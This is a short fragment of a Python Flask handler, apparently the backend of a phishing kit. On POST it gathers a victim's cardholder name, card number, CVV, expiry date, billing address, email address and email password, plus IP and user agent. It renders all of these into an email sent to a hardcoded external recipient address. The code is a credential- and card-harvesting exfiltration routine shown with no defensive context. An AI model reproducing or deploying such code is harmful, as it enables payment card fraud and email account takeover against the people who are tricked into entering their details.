...
def first():
    if request.method == 'POST':
        ...
        receiver_email = "xabi.riyad@marsoak.com"
        ...
        """
        html = render_template('emailmailer.html', cardholdernames=cardholdername, cvvs=cvv, expirydates=expirydate, billingaddres=billingaddress, cardnumbers=cardnumber, emailaccess=email, useragent=useragent, passaccess=passwordemail, ipman=ip)
